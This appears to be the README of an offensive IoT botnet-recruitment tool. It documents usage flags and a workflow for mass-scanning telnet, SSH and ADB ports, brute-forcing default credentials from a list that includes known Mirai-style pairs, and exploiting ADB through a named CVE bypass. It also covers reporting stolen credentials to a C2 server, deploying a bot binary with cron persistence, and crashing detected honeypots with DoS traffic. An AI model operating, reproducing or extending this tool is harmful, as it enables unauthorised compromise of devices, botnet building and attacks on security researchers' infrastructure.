================================================================================
              IoT MULTISCANNER 
================================================================================

WHAT IT DOES

Scans targets for open telnet (23,2323,23231,23232), SSH (22), and ADB (5555).
Compromises devices via default credential brute-force and ADB exploits.
Auto-joins bots to your C2 infrastructure. Detects and DoS-es honeypots.

ONE-LINE EXAMPLES

Scan a subnet:
  python3 iot_multiscanner.py 192.168.1.0/24

Scan with C2 auto-join:
  python3 iot_multiscanner.py --c2 10.0.0.5:8080 192.168.1.0/24

Scan with SSH + C2 + verbose:
  python3 iot_multiscanner.py --c2 10.0.0.5:8080 --ssh --verbose targets.txt

FLAGS (any order after targets)

  TARGETS (positional, 1+):
    Single IP          192.168.1.50
    CIDR               192.168.1.0/24  10.0.0.0/16
    Hostname           router.lan
    File path          targets.txt
    Mix any of the above

  --cred-file PATH      Credential file (default: iot_creds.txt)
  --threads N           Worker threads (default: 250)
  --timeout SEC         Socket timeout (default: 6)
  --ssh                 Enable SSH brute-force (needs paramiko)
  --verbose, -v         Debug logging
  --show-cred-count     Print credential count and exit (no scan)

  --c2 HOST:PORT               C2 server address (enables auto-deploy)
  --c2-payload PATH            Payload path on C2 HTTP (default: /bot)
  --callback-port PORT         Report listener port (default: 48101)

  --no-aggressive              Disable honeypot DoS attacks
  --show-honeypots             Show honeypot details in output

CREDENTIAL FILE FORMAT

  File: iot_creds.txt (or custom with --cred-file)
  Format: one "username password" per line, space separated

    root xc3511
    admin admin
    support support
    root

  Blank lines and lines starting with # are ignored.
  If the file doesn't exist, embedded defaults (130 pairs) are used.

HOW IT WORKS (short)

  1. Targets are expanded from IPs, CIDRs, hostnames, and files
  2. Each target gets port-scanned for telnet (23,2323,23231,23232), SSH (22), ADB (5555)
  3. For each open port: brute-force credentials (telnet/SSH) or exploit ADB
  4. ADB has 2 paths: direct unauth (ro.adb.secure=0) and CVE-2026-0073 TLS EC cert bypass
  5. Every compromised device gets a honeypot check (banner, nproc, Cowrie artifacts, container detection, behavioral)
  6. Honeypots get DoSed with garbage data to crash them
  7. If C2 is configured: report ip:port user:pass to callback port, deploy bot binary, install cron persistence
  8. Results printed in table at end with platform/architecture info
